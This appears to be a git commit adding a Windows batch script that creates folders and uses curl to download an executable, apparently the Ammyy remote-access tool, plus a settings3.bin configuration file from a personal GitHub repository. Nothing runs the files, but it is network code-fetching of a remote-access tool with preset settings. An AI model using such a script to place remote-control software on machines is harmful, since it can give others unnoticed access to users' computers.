55f6bb654a220d030b7b4209076eeda5b350cd1c
Aslan Shkakhov <styaho@yandex.ru>
2025-09-10 15:28:53 +0300

    Script

---
+++ installer.bat
@@ -0,0 +1,7 @@
+@echo off
+mkdir "C:\Program Files\Ammy"
+mkdir "C:\ProgramData\AMMYY"
+
+curl -o "C:\Program Files\Ammy\AA.exe" "https://raw.githubusercontent.com/styaho07/Ammy-installer/main/AA.exe"
+curl -o "C:\ProgramData\AMMYY\settings3.bin" "https://raw.githubusercontent.com/styaho07/Ammy-installer/main/settings3.bin"
+
